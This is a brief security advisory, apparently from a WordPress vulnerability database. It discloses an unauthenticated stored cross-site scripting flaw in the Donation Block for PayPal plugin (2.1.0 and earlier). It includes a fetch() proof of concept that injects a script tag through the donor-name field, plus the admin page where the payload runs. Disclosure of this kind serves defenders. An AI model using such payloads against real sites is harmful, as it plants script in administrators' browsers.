## WordPress Plugin Vulnerabilities

# Donation Block for PayPal <= 2.1.0 - Unauthenticated Stored XSS

### Description

The plugin does not sanitise and escape form submissions, leading to a stored cross-site scripting vulnerability

### Proof of Concept

When the plugin is enabled, run the following JavaScript in the browser console:
```
fetch("/wp-content/plugins/donations-block/public/ajax-submit.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'donner\_name="><script>alert(999)</script>&d&donner\_email=dsa&donner\_phone=123',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
```
To see the XSS, as an admin view the donations at https://example.com/wp-admin/admin.php?page=pdb\_list
